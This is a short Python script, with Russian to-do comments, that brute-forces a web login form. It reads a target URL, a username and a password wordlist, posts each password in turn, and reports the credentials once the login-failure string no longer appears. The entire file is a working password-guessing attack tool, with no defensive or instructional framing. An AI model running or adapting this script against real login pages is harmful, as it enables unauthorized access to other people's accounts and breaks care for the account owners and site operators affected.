# Создать возможность выбора работы с username
# Создать циклы перебора логин:пароль

import requests
import sys
from termcolor import colored


def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print(colored(('Trying: ' + password), 'red'))
        data = {'username': username, 'password': password, 'Login': 'submit'}
        response = requests.post(url, data=data)
        if login_failed_string in response.content.decode():
            pass
        else:
            print(colored(('[+] Found Username: ==> ' + username), 'green'))
            print(colored(('[+] Found Password: ==> ' + password), 'green'))
            exit()


try:
    url = input('[+] Enter Page URL: ')
    username = input('[+] Enter Username For The Account To Bruteforce: ')
    password_file = input('[+] Enter Password File To Use: ')
    login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')

    with open(password_file, 'r') as passwords:
        cracking(username, url)

    print('[!!] Password Not In List')

except KeyboardInterrupt:
    print("\n Program finished by user !!!!")
    sys.exit()

